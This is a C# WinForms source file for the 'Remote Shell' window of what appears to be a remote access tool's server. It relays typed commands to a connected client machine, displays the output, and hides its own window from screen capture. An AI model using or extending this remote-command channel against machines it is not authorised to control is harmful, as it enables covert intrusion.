using Pulsar.Common.Messages;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmRemoteShell : Form
    {
        private readonly Client _connectClient;
        public readonly RemoteShellHandler RemoteShellHandler;

        private static readonly Dictionary<Client, FrmRemoteShell> OpenedForms =
            new Dictionary<Client, FrmRemoteShell>();

        public static FrmRemoteShell CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
                return OpenedForms[client];

            FrmRemoteShell f = new FrmRemoteShell(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        public FrmRemoteShell(Client client)
        {
            _connectClient = client;
            RemoteShellHandler = new RemoteShellHandler(client);

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            ApplyAutoTheme();

            txtConsoleOutput.AppendText(">> Type 'exit' to close this session" + Environment.NewLine);
        }

        private bool IsDarkBackground()
        {
            int brightness = (this.BackColor.R + this.BackColor.G + this.BackColor.B) / 3;
            return brightness < 128;
        }

        private void ApplyAutoTheme()
        {
            if (IsDarkBackground())
            {
                txtConsoleOutput.BackColor = Color.FromArgb(30, 30, 30);
                txtConsoleOutput.ForeColor = Color.WhiteSmoke;

                txtConsoleInput.BackColor = Color.FromArgb(30, 30, 30);
                txtConsoleInput.ForeColor = Color.WhiteSmoke;
            }
            else
            {
                txtConsoleOutput.BackColor = Color.White;
                txtConsoleOutput.ForeColor = Color.Black;

                txtConsoleInput.BackColor = Color.White;
                txtConsoleInput.ForeColor = Color.Black;
            }
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            RemoteShellHandler.ProgressChanged += CommandOutput;
            RemoteShellHandler.CommandError += CommandError;
            MessageHandler.Register(RemoteShellHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(RemoteShellHandler);
            RemoteShellHandler.ProgressChanged -= CommandOutput;
            RemoteShellHandler.CommandError -= CommandError;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void CommandOutput(object sender, string output)
        {
            txtConsoleOutput.SelectionColor = IsDarkBackground()
                ? Color.WhiteSmoke
                : Color.Black;

            txtConsoleOutput.AppendText(output);
        }

        private void CommandError(object sender, string output)
        {
            txtConsoleOutput.SelectionColor = IsDarkBackground()
                ? Color.Red
                : Color.DarkRed;

            txtConsoleOutput.AppendText(output);
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
                this.Invoke((MethodInvoker)this.Close);
        }

        private void FrmRemoteShell_Load(object sender, EventArgs e)
        {
            this.DoubleBuffered = true;
            this.Text = WindowHelper.GetWindowTitle("Remote Shell", _connectClient);
        }

        private void FrmRemoteShell_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            RemoteShellHandler.Dispose();

            if (_connectClient.Connected)
                RemoteShellHandler.SendCommand("exit");
        }

        private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            NativeMethodsHelper.ScrollToBottom(txtConsoleOutput.Handle);
        }

        private void txtConsoleInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(txtConsoleInput.Text.Trim()))
            {
                string input = txtConsoleInput.Text.TrimStart(' ', ' ').TrimEnd(' ', ' ');
                txtConsoleInput.Text = string.Empty;

                string[] splitSpaceInput = input.Split(' ');
                string[] splitNullInput = input.Split(' ');

                if (input == "exit" ||
                    (splitSpaceInput.Length > 0 && splitSpaceInput[0] == "exit") ||
                    (splitNullInput.Length > 0 && splitNullInput[0] == "exit"))
                {
                    this.Close();
                }
                else
                {
                    switch (input)
                    {
                        case "cls":
                            txtConsoleOutput.Text = string.Empty;
                            break;
                        default:
                            RemoteShellHandler.SendCommand(input);
                            break;
                    }
                }

                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void txtConsoleOutput_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar != (char)2)
            {
                txtConsoleInput.Text += e.KeyChar.ToString();
                txtConsoleInput.Focus();
                txtConsoleInput.SelectionStart = txtConsoleOutput.TextLength;
                txtConsoleInput.ScrollToCaret();
            }
        }
    }
}
